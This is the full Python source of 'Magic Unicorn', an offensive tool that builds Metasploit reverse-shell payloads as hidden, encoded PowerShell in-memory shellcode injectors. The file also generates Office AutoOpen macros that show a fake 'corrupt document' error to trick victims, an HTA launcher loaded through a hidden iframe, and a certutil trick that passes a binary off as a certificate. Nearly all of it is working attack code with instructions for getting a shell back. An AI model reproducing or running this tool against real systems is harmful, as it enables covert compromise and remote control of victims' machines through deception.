#!/usr/bin/python
#
# Magic Unicorn - PowerShell downgrade attack and exploitation tool
#
# Written by: Dave Kennedy (@HackingDave)
# Company: TrustedSec (@TrustedSec) https://www.trustedsec.com
#
# Real quick down and dirty for native x86 powershell on any platform
#
# Usage: python unicorn.py payload reverse_ipaddr port <optional hta or macro>
# Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443
# Macro Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443 macro
# HTA Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443 hta
#
# Requirements: Need to have Metasploit installed.
#
# Special thanks to Matthew Graeber and Josh Kelley
#
import base64
import re
import subprocess
import sys
import os
import shutil

# display unicorn banner
def gen_unicorn():
                print r"""
                                                         ,/
                                                        //
                                                      ,//
                                          ___   /|   |//
                                      `__/\_ --(/|___/-/
                                   \|\_-\___ __-_`- /-/ \.
                                  |\_-___,-\_____--/_)' ) \
                                   \ -_ /     __ \( `( __`\|
                                   `\__|      |\)\ ) /(/|
           ,._____.,            ',--//-|      \  |  '   /
          /     __. \,          / /,---|       \       /
         / /    _. \  \        `/`_/ _,'        |     |
        |  | ( (  \   |      ,/\'__/'/          |     |
        |  \  \`--, `_/_------______/           \(   )/
        | | \  \_. \,                            \___/\
        | |  \_   \  \                                 \
        \ \    \_ \   \   /                             \
         \ \  \._  \__ \_|       |                       \
          \ \___  \      \       |                        \
           \__ \__ \  \_ |       \                         |
           |  \_____ \  ____      |                        |
           | \  \__ ---' .__\     |        |               |
           \  \__ ---   /   )     |        \              /
            \   \____/ / ()(      \          `---_       /|
             \__________/(,--__    \_________.    |    ./ |
               |     \ \  `---_\--,           \   \_,./   |
               |      \  \_ ` \    /`---_______-\   \\    /
                \      \.___,`|   /              \   \\   \
                 \     |  \_ \|   \              (   |:    |
                  \    \      \    |             /  / |    ;
                   \    \      \    \          ( `_'   \  |
                    \.   \      \.   \          `__/   |  |
                      \   \       \.  \                |  |
                       \   \        \  \               (  )
                        \   |        \  |              |  |
                         |  \         \ \              I  `
                         ( __;        ( _;            ('-_';
                         |___\        \___:            \___:
                """


# display macro help
def macro_help():
	print """
[*******************************************************************************************************]

      				-----MACRO ATTACK INSTRUCTIONS----

For the macro attack, you will need to go to File, Properties, Ribbons, and select Developer. Once you do that, you will have a developer tab. Create a new macro, call it AutoOpen and paste the generated code into that. This will automatically run. Note that a message will prompt to the user saying that the file is corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! This is  tricking the victim to thinking the excel document is corrupted. You should get a shell through powershell injection after that.

NOTE: WHEN COPYING AND PASTING THE EXCEL, IF THERE ARE ADDITIONAL SPACES THAT ARE ADDED YOU NEED TO REMOVE THESE AFTER EACH OF THE POWERSHELL CODE SECTIONS UNDER VARIABLE "x" OR A SYNTAX ERROR WILL HAPPEN!

[*******************************************************************************************************]

	"""

# display hta help
def hta_help():
	print """
[*******************************************************************************************************]

                                -----HTA ATTACK INSTRUCTIONS----

The HTA attack will automatically generate two files, the first the index.html which tells the browser to use Launcher.hta which contains the malicious powershell injection code. All files are exported to the hta_access/ folder and there will be three main files. The first is index.html, second Launcher.hta and the last, the unicorn.rc file. You can run msfconsole -r unicorn.rc to launch the listener for  Metasploit.

A user must click allow and accept when using the HTA attack in order for the powershell injection to work properly.

[*******************************************************************************************************]

	"""

# display powershell help
def ps_help():
	print """
[*******************************************************************************************************]

			      -----POWERSHELL ATTACK INSTRUCTIONS----

Everything is now generated in two files, powershell_attack.txt and unicorn.rc. The text file contains all of the code needed in order to inject the powershell attack into memory. Note you will need a place that supports remote command injection of some sort. Often times this could be through an excel/word  doc or through psexec_commands inside of Metasploit, SQLi, etc.. There are so many implications and  scenarios to where you can use this attack at. Simply paste the powershell_attacks.txt command in any command prompt window or where you have the ability to call the powershell executable and it will give a shell back to you. Note that you will need to have a listener enabled in order to capture the attack.

[*******************************************************************************************************] 
	"""

# display cert help
def cert_help():
	print """
[***********************************************************************************************$

                              -----CERUTIL Attack Instruction----

The certutil attack vector was identified by Matthew Graeber (@mattifestation) which allows you to take a binary file, move it into a base64 format and use certutil on the victim machine to convert it back to a binary for you. This should work on virtually any system and allow you to transfer a binary to the victim machine through a fake certificate file. To use this attack, simply place an executable in the path of unicorn and run python unicorn.py <exe_name> crt in order to get the base64 output. Once thats finished, go to decode_attack/ folder which contains the files. The bat file is a command that can be run in a windows machine to convert it back to a binary. 

[***********************************************************************************************$
	"""

# usage banner
def gen_usage():
	print "-------------------- Magic Unicorn Attack Vector v2.0-----------------------------"
	print "\nNative x86 powershell injection attacks on any Windows platform."
	print "Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)"
	print "Twitter: @TrustedSec, @HackingDave"
	print "Credits: Matthew Graeber, Justin Elze, Chris Gates"
	print "\nHappy Magic Unicorns."
	print ""
	print "Usage: python unicorn.py payload reverse_ipaddr port <optional hta or macro, crt>"
	print "PS Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443"
	print "Macro Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443 macro"
	print "HTA Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443 hta"
	print "CRT Example: python unicorn.py <path_to_payload/exe_encode> crt"
	print "Help Menu: python unicorn.py --help\n"

# split string
def split_str(s, length):
    return [s[i:i+length] for i in range(0, len(s), length)]

# generate full macro
def genMacro(full_attack):
    #start of the macro
    macro_str = "Sub AutoOpen()\nDim x\nx = "
    linelength = 380
    powershell_command_list = split_str(full_attack, linelength)

    for line in powershell_command_list:
        macro_str +=  "& \"" + line + "\" _\n"

    # remove trailing "_ \r\n"
    macro_str = macro_str[:-4]
    # remove first occurence of &
    macro_str = macro_str.replace("& ","",1)

    # end of macro
    macro_str += """
    Shell ("POWERSHELL.EXE " & x)
    Dim title As String
    title = "Critical Microsoft Office Error"
    Dim msg As String
    Dim intResponse As Integer
    msg = "This document appears to be corrupt or missing critical rows in order to restore. Please restore this file from a backup."
    intResponse = MsgBox(msg, 16, title)
    Application.Quit
    End Sub
    """
    return macro_str


# generate Matthew Graeber's (Matt rocks) attack for binary to cert format - https://gist.github.com/mattifestation/47f9e8a431f96a266522
def gen_cert(filename):
	if os.path.isfile(filename):
		# make sure the directory is made
		if not os.path.isdir("decode_attack"):
			os.makedirs("decode_attack")

		# remove old files here
		if os.path.isfile("decode_attack/encoded_attack.crt"):
			os.remove("decode_attack/encoded_attack.crt")

		print "[*] Importing in binary file to base64 encode it for certutil prep."
		data = file(filename, "rb").read()
		data = base64.b64encode(data)
		print "[*] Writing out the file to decode_attack/encoded_attack.crt"
		filewrite = file("decode_attack/encoded_attack.crt", "w")
		filewrite.write("-----BEGIN CERTIFICATE-----\n")
		filewrite.write(data)
		filewrite.write("\n-----END CERTIFICATE-----")
		filewrite.close()
		print "[*] Filewrite complete, writing out decode string for you.."
		filewrite = file("decode_attack/decode_command.bat", "w")
		filewrite.write("certutil -decode encoded_attack.crt encoded.exe")
		filewrite.close()
		print "[*] Exported attackunder decode_attack/"
		print "[*] There are two files, encoded_attack.crt contains your encoded data"
		print "[*] The second file, decode_command.bat will decode the cert to an executable."		
	else:
		print "[!] File was not found. Exiting the unicorn attack."
		sys.exit() 

# generate HTA attack method
def gen_hta(command):

# HTA code here
	main1 = """<script>\na=new ActiveXObject("WScript.Shell");\na.run('%%windir%%\\\\System32\\\\cmd.exe /c %s');window.close();\n</script>""" % (command)
        main2 = """<iframe id="frame" src="Launcher.hta" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe>"""

	# make a directory if its not there
	if not os.path.isdir("hta_attack"): os.makedirs("hta_attack")

	# write out index file
	print "[*] Writing out index file to hta_attack/index.html"
	filewrite = file("hta_attack/index.html", "w")
	filewrite.write(main2)
	filewrite.close()

	# write out Launcher.hta
	print "[*] Writing malicious hta launcher hta_attack/Launcher.hta"
	filewrite = file("hta_attack/Launcher.hta", "w")
	filewrite.write(main1)
	filewrite.close()

# generate base shellcode
def generate_shellcode(payload,ipaddr,port):
    print "[*] Generating the payload shellcode.. This could take a few seconds/minutes as we create the shellcode..."
    port = port.replace("LPORT=", "")
    proc = subprocess.Popen("msfvenom -p %s LHOST=%s LPORT=%s StagerURILength=5 StagerVerifySSLCert=false -e x86/shikata_ga_nai -a x86 --platform windows -f c" % (payload,ipaddr,port), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    data = proc.communicate()[0]
    # start to format this a bit to get it ready
    repls = {';' : '', ' ' : '', '+' : '', '"' : '', '\n' : '', 'buf=' : '', 'Found 0 compatible encoders' : '', 'unsignedcharbuf[]=' : ''}
    data = reduce(lambda a, kv: a.replace(*kv), repls.iteritems(), data).rstrip()
    return data

def format_payload(payload, ipaddr, port, macro):

    # regular payload generation stuff
    # generate our shellcode first
    shellcode = generate_shellcode(payload, ipaddr, port).rstrip()
    # sub in \x for 0x
    shellcode = re.sub("\\\\x", "0x", shellcode)
    # base counter
    counter = 0
    # count every four characters then trigger floater and write out data
    floater = ""
    # ultimate string
    newdata = ""
    for line in shellcode:
        floater = floater + line
        counter = counter + 1
        if counter == 4:
            newdata = newdata + floater + ","
            floater = ""
            counter = 0

    # heres our shellcode prepped and ready to go
    shellcode = newdata[:-1]
	    
    # one line shellcode injection with native x86 shellcode
    powershell_code = (r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-enc ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2 $e"}else{;iex "& powershell $2 $e";}""" %  (shellcode))
	
    full_attack = "powershell -window hidden -enc " + base64.b64encode(powershell_code.encode('utf_16_le'))  

    if macro == "macro":
        macro_attack = genMacro(full_attack)
        filewrite = file("powershell_attack.txt", "w")
        filewrite.write(macro_attack)
        filewrite.close()

    elif macro =="hta":
	gen_hta(full_attack)

    else:
        # write out powershell attacks
        filewrite = file("powershell_attack.txt", "w")
        filewrite.write(full_attack)
        filewrite.close()

    # write out rc file
    filewrite = file("unicorn.rc", "w")
    filewrite.write("use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nexploit -j\n" % (payload,ipaddr,port))
    filewrite.close()

    # move unicorn to hta attack if hta specified
    if macro == "hta":
	shutil.move("unicorn.rc", "hta_attack/")

    gen_unicorn()
    print "Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)"
    print "Twitter: @TrustedSec, @HackingDave"
    print "\nHappy Magic Unicorns."

    if macro == "macro":
	    macro_help()

    if macro == "hta":
            hta_help()

    if macro != "hta":
    	ps_help()
	    
    if macro != "hta":
	print "[*] Exported powershell output code to powershell_attack.txt."
	print "[*] Exported Metasploit RC file as unicorn.rc. Run msfconsole -r unicorn.rc to execute and create listener.\n"

    if macro == "hta": 
	print "[*] Exported index.html, Launcher.hta, and unicorn.rc under hta_attack/." 
	print "[*] Run msfconosle -r unicorn.rc to launch listener and move index and launcher to web server.\n"

# pull the variables needed for usage
try:
    if len(sys.argv) > 1:
	    if sys.argv[1] == "--help":
			ps_help()
			macro_help()
			hta_help()
			cert_help()
			gen_usage()
			sys.exit()

    # if we are using macros
    if len(sys.argv) == 5:
        payload = sys.argv[1]
        ipaddr = sys.argv[2]
        port = sys.argv[3]
        macro = sys.argv[4]
        format_payload(payload,ipaddr,port, macro)
    
    # regular unicorn attack
    elif len(sys.argv) == 4:
        	payload = sys.argv[1]
        	ipaddr = sys.argv[2]
        	port = sys.argv[3]
        	macro = ""
        	format_payload(payload,ipaddr,port, macro)
    
    # Matthews base64 cert attack
    elif len(sys.argv) == 3:
		if sys.argv[2] == "crt":
			payload = sys.argv[1]
			cert_help()		
			# generate the attack vector
			gen_cert(payload)

		else:
			print "[!] Invalid filename or handler, type unicorn.py <filename> crt to do the cert attack"
			sys.exit()
		
    
    # if we did supply parameters
    elif len(sys.argv) < 3:
		gen_unicorn()
		gen_usage()

except Exception, e:
	print "[!] Something went wrong, printing the error: " + str(e)
